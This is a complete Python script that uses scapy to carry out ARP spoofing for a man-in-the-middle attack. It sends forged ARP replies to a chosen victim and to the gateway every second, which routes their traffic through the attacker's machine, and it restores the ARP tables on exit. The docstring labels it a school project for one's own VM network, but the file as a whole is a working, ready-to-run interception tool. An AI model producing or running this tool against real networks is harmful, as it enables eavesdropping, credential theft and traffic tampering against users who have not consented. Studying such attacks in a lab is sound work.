#!/usr/bin/env python3
"""
ARP Spoofing Script for MITM Demonstration
School Project - Use only on your own network in a controlled VM environment.

This script sends forged ARP replies to both the victim and the gateway,
causing traffic between them to flow through the attacker's machine.
"""

import argparse
import sys
import time
import signal
from scapy.all import Ether, ARP, sendp, getmacbyip, conf

# Suppress scapy warnings
conf.verb = 0


def get_mac(ip):
    """Resolve an IP address to its MAC address via ARP."""
    mac = getmacbyip(ip)
    if mac is None:
        print(f"[!] Could not resolve MAC for {ip}. Is the host up?")
        sys.exit(1)
    return mac


def spoof(target_ip, target_mac, spoof_ip, iface):
    """Send a single ARP reply telling target_ip that spoof_ip is at our MAC."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,            # ARP reply
        pdst=target_ip,  # tell this host...
        hwdst=target_mac,
        psrc=spoof_ip    # ...that this IP is at our MAC
    )
    sendp(packet, iface=iface, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, iface):
    """Restore the original ARP table entry."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    # Send multiple times to make sure it sticks
    sendp(packet, iface=iface, count=5, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="ARP Spoofer for MITM Demo")
    parser.add_argument("--victim", required=True, help="Victim IP address")
    parser.add_argument("--gateway", required=True, help="Gateway/Server IP address")
    parser.add_argument("--iface", default="eth0", help="Network interface (default: eth0)")
    args = parser.parse_args()

    victim_ip = args.victim
    gateway_ip = args.gateway
    iface = args.iface

    print(f"[*] Resolving MAC addresses...")
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"[+] Victim  : {victim_ip} ({victim_mac})")
    print(f"[+] Gateway : {gateway_ip} ({gateway_mac})")
    print(f"[+] Interface: {iface}")
    print(f"[*] Starting ARP spoofing... Press Ctrl+C to stop.")
    print()

    packets_sent = 0

    def cleanup(sig=None, frame=None):
        print(f"\n[*] Restoring ARP tables...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
        print(f"[+] ARP tables restored. Sent {packets_sent} spoofed packets total.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    try:
        while True:
            # Tell victim: "gateway IP is at MY mac"
            spoof(victim_ip, victim_mac, gateway_ip, iface)
            # Tell gateway: "victim IP is at MY mac"
            spoof(gateway_ip, gateway_mac, victim_ip, iface)
            packets_sent += 2
            print(f"\r[*] Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        cleanup()


if __name__ == "__main__":
    main()
